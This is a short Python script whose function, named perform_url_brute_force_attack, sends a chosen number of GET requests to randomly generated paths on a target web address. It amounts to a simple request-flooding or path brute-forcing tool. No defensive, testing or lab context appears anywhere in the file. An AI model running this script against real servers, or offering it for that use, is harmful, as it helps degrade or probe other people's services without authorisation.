import random
import string
import requests

SERVER_RANDOM_PATH_LENGTH = 5
DEFAULT_TIMEOUT = 3


def generate_random_url(target_address: str) -> str:
    random_path = ''.join(random.choices(string.ascii_letters, k=SERVER_RANDOM_PATH_LENGTH))
    return f"{target_address}/{random_path}"


def perform_url_brute_force_attack(target_address: str, number_of_packets: int):
    random_urls = [generate_random_url(target_address) for _ in range(number_of_packets)]
    successful_requests = 0
    for idx, random_url in enumerate(random_urls):
        try:
            requests.get(random_url, timeout=DEFAULT_TIMEOUT)
            successful_requests += 1
            print(f"Done sending {idx + 1} requests with random urls. Current url: {random_url}.")
        except Exception as e:
            print(f"An error occurred: {e}. Sent {successful_requests} packets. \nGoodbye.")
            break
